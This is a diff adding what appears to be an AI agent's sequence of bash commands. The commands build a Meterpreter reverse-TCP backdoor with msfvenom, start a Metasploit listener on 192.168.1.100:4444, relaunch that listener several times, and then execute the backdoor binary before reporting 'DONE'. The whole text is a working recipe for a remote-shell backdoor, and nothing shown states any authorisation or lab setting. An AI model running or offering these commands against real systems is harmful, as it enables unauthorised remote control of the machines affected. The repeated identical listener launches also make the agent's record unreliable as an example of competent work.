@@ -1,0 +1,42 @@
+RESPONSE: ```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > backdoor.elf
+```
+RESPONSE: ```bash
+msfdb init
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+msfdb start
+```
+RESPONSE: ```bash
+chmod +x backdoor.elf && ls -l backdoor.elf
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+ss -tuln | grep 4444
+```
+RESPONSE: ```bash
+WAIT
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
+```
+RESPONSE: ```bash
+./backdoor.elf
+```
+RESPONSE: ```bash
+DONE
+```
